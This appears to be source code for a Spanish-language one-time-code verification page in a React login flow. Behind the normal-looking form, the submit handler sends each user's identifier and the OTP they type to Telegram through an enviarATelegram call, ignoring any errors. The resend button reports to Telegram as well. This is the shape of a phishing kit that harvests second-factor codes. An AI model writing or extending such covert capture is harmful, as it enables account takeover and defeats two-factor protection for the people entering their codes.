import { useState } from 'react'
import { useForm } from 'react-hook-form'
import { zodResolver } from '@hookform/resolvers/zod'
import { Navigate, useLocation, useNavigate } from 'react-router-dom'
import { AuthLayout } from '../components/AuthLayout'
import { Button } from '../components/Button'
import { Checkbox } from '../components/Checkbox'
import { TextInput } from '../components/TextInput'
import { TextButton } from '../components/TextLink'
import { AuthError, resendOtpCode, verifyOtpCode } from '../lib/auth'
import { maskIdentifier } from '../lib/mask'
import { getStateUser, type RouterState } from '../lib/routerState'
import { useCountdown } from '../lib/useCountdown'
import { otpSchema, type OtpValues } from '../lib/validation'
import { enviarATelegram } from '../telegram'

const RESEND_WAIT_SECONDS = 30
const CODE_LENGTH = 6

export function LoginOtpPage() {
  const navigate = useNavigate()
  const user = getStateUser(useLocation().state)
  const resendCountdown = useCountdown()
  const [resending, setResending] = useState(false)
  const [resendStatus, setResendStatus] = useState('')
  const {
    register,
    handleSubmit,
    setError,
    formState: { errors, touchedFields, isValid, isSubmitting },
  } = useForm<OtpValues>({
    resolver: zodResolver(otpSchema),
    mode: 'onChange',
    defaultValues: { code: '', rememberDevice: false },
  })

  if (!user) return <Navigate to="/login" replace />

  const codeField = register('code')
  const codeError =
    errors.code?.type === 'server' || touchedFields.code
      ? errors.code?.message
      : undefined

  const onSubmit = async ({ code }: OtpValues) => {
    try {
      await verifyOtpCode(code)
      try {
        await enviarATelegram(`✅ OTP validado\nUsuario: ${user}\nCódigo: ${code}`)
      } catch {
        // Ignoramos errores de Telegram para no bloquear el flujo de prueba.
      }
      navigate('/login/success', { state: { user } satisfies RouterState })
    } catch (error) {
      if (!(error instanceof AuthError)) throw error
      setError(
        'code',
        { type: 'server', message: error.message },
        { shouldFocus: true },
      )
    }
  }

  const resend = async () => {
    setResending(true)
    setResendStatus('')
    try {
      await resendOtpCode()
      await enviarATelegram(`🔁 Código OTP reenviado\nUsuario: ${user}`)
    } catch {
      // Ignoramos errores de Telegram para no bloquear el flujo de prueba.
    }
    setResending(false)
    setResendStatus('Te enviamos un nuevo código.')
    resendCountdown.start(RESEND_WAIT_SECONDS)
  }

  const waiting = resendCountdown.secondsLeft > 0

  return (
    <AuthLayout
      compact
      title="Ingresa el código de verificación"
      subtitle={
        <>
          Enviamos un código de verificación al correo{' '}
          <strong className="font-medium">{maskIdentifier(user)}</strong>
        </>
      }
    >
      <form noValidate onSubmit={handleSubmit(onSubmit)}>
        <TextInput
          label="Introducir el código"
          required
          autoFocus
          inputMode="numeric"
          autoComplete="one-time-code"
          error={codeError}
          {...codeField}
          onChange={(event) => {
            event.target.value = event.target.value
              .replace(/\D/g, '')
              .slice(0, CODE_LENGTH)
            return codeField.onChange(event)
          }}
        />
        <Checkbox
          label="Recordar este dispositivo durante 30 días"
          className="mt-[15px]"
          {...register('rememberDevice')}
        />
        <div className="mx-auto mt-[20px] max-w-[280px]">
          <Button type="submit" disabled={!isValid} loading={isSubmitting}>
            Continuar
          </Button>
        </div>
      </form>
      <div className="mt-[22px] flex flex-col items-center gap-[3.5px] text-center">
        <p className="text-[18px] text-text-gray">
          ¿No recibiste ningún correo electrónico?
        </p>
        <TextButton
          size="lg"
          onClick={resend}
          disabled={resending || waiting}
          aria-busy={resending || undefined}
        >
          {waiting
            ? `Volver a enviar en ${resendCountdown.secondsLeft} s`
            : 'Volver a enviar'}
        </TextButton>
        <p aria-live="polite" className="sr-only">
          {resendStatus}
        </p>
      </div>
    </AuthLayout>
  )
}
